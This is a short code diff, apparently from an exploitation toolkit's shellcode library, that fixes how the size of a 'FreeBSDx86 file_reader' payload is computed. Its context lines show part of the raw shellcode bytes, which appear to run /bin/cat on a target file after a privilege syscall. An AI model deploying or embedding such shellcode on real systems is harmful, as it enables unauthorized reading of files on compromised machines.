@@ -6,7 +6,7 @@ class Payload(Shellcode):
     Shellcode.info["name"] = "FreeBSDx86 - file_reader shellcode"
 
     def __init__(self, **kwargs): 
-        Shellcode.info["size"] = 46 + Shellcode.getsize(kwargs["file"])
+        Shellcode.info["size"] = 46 + Shellcode().getsize(kwargs["file"])
         Shellcode.info["payload"] = [
             r"\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f"
             r"\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
